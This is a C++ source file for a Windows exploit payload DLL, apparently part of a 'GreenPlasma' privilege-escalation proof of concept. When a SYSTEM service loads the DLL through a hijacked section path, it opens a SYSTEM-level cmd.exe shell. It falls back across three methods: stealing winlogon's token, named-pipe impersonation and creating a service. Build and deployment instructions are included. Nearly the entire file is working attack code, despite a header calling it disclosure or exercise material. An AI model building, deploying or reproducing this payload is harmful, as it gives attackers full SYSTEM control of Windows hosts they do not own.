// greenplasma_payload.dll - SYSTEM Shell Payload
// For responsible disclosure / cyber exercise use only
//
// This DLL is loaded by a SYSTEM service when the GreenPlasma exploit
// plants its path into the CTF AsmListCache section. Upon loading,
// it spawns a SYSTEM-level shell.
//
// Build (x64 Native Tools Command Prompt):
//   DLL:  cl /EHsc /LD /Fe:greenplasma_payload.dll payload.cpp /link advapi32.lib
//   EXE:  cl /EHsc /DSTANDALONE_EXE /Fe:greenplasma_payload.exe payload.cpp /link advapi32.lib shell32.lib
//
// Deploy: Copy to C:\Temp\greenplasma_payload.dll (or modify path in PoC.cpp)

#include <Windows.h>
#include <Shellapi.h>
#include <TlHelp32.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ============================================================================
// Technique 1: CreateProcessAs SYSTEM (via token duplication)
// ============================================================================
// Gets the SYSTEM token from winlogon.exe and spawns a shell with it.
// This is the most reliable method for getting a full interactive SYSTEM shell.
// ============================================================================
BOOL SpawnSystemShell_CreateProcess() {
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    BOOL bResult = FALSE;

    // Find winlogon.exe PID (always runs as SYSTEM in the active session)
    DWORD winlogonPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32 = { 0 };
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
                    winlogonPid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }

    if (!winlogonPid) {
        OutputDebugStringA("[Payload] winlogon.exe not found\n");
        return FALSE;
    }

    // Open winlogon process and duplicate its SYSTEM token
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProcess) {
        OutputDebugStringA("[Payload] Failed to open winlogon process\n");
        return FALSE;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        OutputDebugStringA("[Payload] Failed to open process token\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    // Duplicate the SYSTEM token
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                           SecurityImpersonation, TokenPrimary, &hDupToken)) {
        OutputDebugStringA("[Payload] Failed to duplicate token\n");
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get current session ID so the shell appears on the user's desktop
    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    // Assign the shell to the user's session (not Session 0)
    SetTokenInformation(hDupToken, TokenSessionId, &sessionId, sizeof(sessionId));

    // Launch cmd.exe as SYSTEM in the user's session
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    WCHAR cmdline[] = L"cmd.exe";
    bResult = CreateProcessAsUserW(
        hDupToken,
        NULL,           // Application name
        cmdline,        // Command line (writable copy)
        NULL, NULL,      // Process/Thread security
        FALSE,           // Inherit handles
        CREATE_NEW_CONSOLE,
        NULL, NULL,      // Environment, Current directory
        &si, &pi
    );

    if (bResult) {
        OutputDebugStringA("[Payload] SYSTEM shell spawned successfully!\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        OutputDebugStringA("[Payload] CreateProcessAsUser failed\n");
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return bResult;
}

// ============================================================================
// Technique 2: Named Pipe Impersonation (fallback)
// ============================================================================
// Creates a named pipe, waits for a SYSTEM process to connect (or triggers
// one via ctfmon), then impersonates the SYSTEM token.
// ============================================================================
BOOL SpawnSystemShell_NamedPipe() {
    HANDLE hPipe = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    BOOL bResult = FALSE;

    // Create a named pipe that SYSTEM services might connect to
    WCHAR pipeName[] = L"\\\\.\\pipe\\GreenPlasmaSystemPipe";
    hPipe = CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, 4096, 4096, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        OutputDebugStringA("[Payload] Failed to create named pipe\n");
        return FALSE;
    }

    // Wait for a connection (with timeout)
    OutputDebugStringA("[Payload] Waiting for SYSTEM process to connect to pipe...\n");
    
    // Trigger ctfmon to potentially connect
    HMODULE hCldapi = LoadLibraryA("cldapi.dll");
    if (hCldapi) {
        typedef DWORD(WINAPI* pCfAbortOperation)(DWORD, void*, DWORD);
        pCfAbortOperation CfAbortOp = (pCfAbortOperation)GetProcAddress(hCldapi, "CfAbortOperation");
        if (CfAbortOp) {
            CfAbortOp(GetCurrentProcessId(), NULL, 0x2);
        }
    }

    // Connect with timeout
    if (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            OutputDebugStringA("[Payload] Pipe connection failed\n");
            CloseHandle(hPipe);
            return FALSE;
        }
    }

    // Impersonate the client (should be SYSTEM)
    if (ImpersonateNamedPipeClient(hPipe)) {
        if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &hToken)) {
            if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                                  SecurityImpersonation, TokenPrimary, &hDupToken)) {
                DWORD sessionId = 0;
                ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
                SetTokenInformation(hDupToken, TokenSessionId, &sessionId, sizeof(sessionId));

                STARTUPINFOW si = { 0 };
                PROCESS_INFORMATION pi = { 0 };
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_SHOW;

                WCHAR cmdline[] = L"cmd.exe";
                bResult = CreateProcessAsUserW(
                    hDupToken, NULL, cmdline,
                    NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                    NULL, NULL, &si, &pi);

                if (bResult) {
                    OutputDebugStringA("[Payload] SYSTEM shell via named pipe impersonation!\n");
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                CloseHandle(hDupToken);
            }
            CloseHandle(hToken);
        }
        RevertToSelf();
    }

    CloseHandle(hPipe);
    return bResult;
}

// ============================================================================
// Technique 3: Service-based SYSTEM shell (most persistent)
// ============================================================================
// Creates a Windows service that runs as SYSTEM. When started, the service
// spawns cmd.exe in the user's session.
// ============================================================================
BOOL SpawnSystemShell_Service() {
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL bResult = FALSE;

    WCHAR svcName[] = L"GreenPlasmaSvc";
    WCHAR svcDisplay[] = L"Green Plasma Test Service";
    WCHAR svcPath[] = L"cmd.exe /c start cmd.exe";

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        OutputDebugStringA("[Payload] Failed to open SCM\n");
        return FALSE;
    }

    // Create service (will fail if it already exists, which is fine)
    hService = CreateServiceW(
        hSCM, svcName, svcDisplay,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        svcPath, NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        // Try to open existing service
        hService = OpenServiceW(hSCM, svcName, SERVICE_ALL_ACCESS);
    }

    if (hService) {
        StartServiceW(hService, 0, NULL);
        OutputDebugStringA("[Payload] Service started\n");

        // Clean up: delete the service after use
        DeleteService(hService);
        CloseServiceHandle(hService);
        bResult = TRUE;
    }

    CloseServiceHandle(hSCM);
    return bResult;
}

// ============================================================================
// DLL Entry Point
// ============================================================================
// When the SYSTEM service loads this DLL via the section hijack,
// DllMain fires and spawns a SYSTEM shell.
// ============================================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Don't block the loader - spawn shell in a thread
        DisableThreadLibraryCalls(hModule);

        // Try Technique 1 first (most reliable for interactive shells)
        if (SpawnSystemShell_CreateProcess()) {
            OutputDebugStringA("[Payload] Technique 1 (CreateProcessAs SYSTEM) succeeded\n");
            break;
        }

        // Fallback to Technique 2 (named pipe impersonation)
        if (SpawnSystemShell_NamedPipe()) {
            OutputDebugStringA("[Payload] Technique 2 (Named Pipe) succeeded\n");
            break;
        }

        // Last resort: Technique 3 (service-based)
        if (SpawnSystemShell_Service()) {
            OutputDebugStringA("[Payload] Technique 3 (Service) succeeded\n");
            break;
        }

        OutputDebugStringA("[Payload] All techniques failed\n");
        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// ============================================================================
// Standalone EXE Mode
// ============================================================================
// If compiled as an EXE instead of DLL, this entry point is used.
// Useful for testing the payload independently.
// ============================================================================
#ifdef STANDALONE_EXE
int wmain(int argc, wchar_t** argv) {
    printf("[Payload] GreenPlasma SYSTEM Shell Payload\n");
    printf("[Payload] ====================================\n\n");

    printf("[*] Attempting Technique 1: CreateProcessAs SYSTEM (winlogon token)...\n");
    if (SpawnSystemShell_CreateProcess()) {
        printf("[+] SYSTEM shell spawned via Technique 1!\n");
        return 0;
    }
    printf("[-] Technique 1 failed.\n\n");

    printf("[*] Attempting Technique 2: Named Pipe Impersonation...\n");
    if (SpawnSystemShell_NamedPipe()) {
        printf("[+] SYSTEM shell spawned via Technique 2!\n");
        return 0;
    }
    printf("[-] Technique 2 failed.\n\n");

    printf("[*] Attempting Technique 3: Service-based SYSTEM shell...\n");
    if (SpawnSystemShell_Service()) {
        printf("[+] SYSTEM shell spawned via Technique 3!\n");
        return 0;
    }
    printf("[-] Technique 3 failed.\n\n");

    printf("[!] All techniques failed. Ensure running on Windows 11/2022/2026.\n");
    return 1;
}
#endif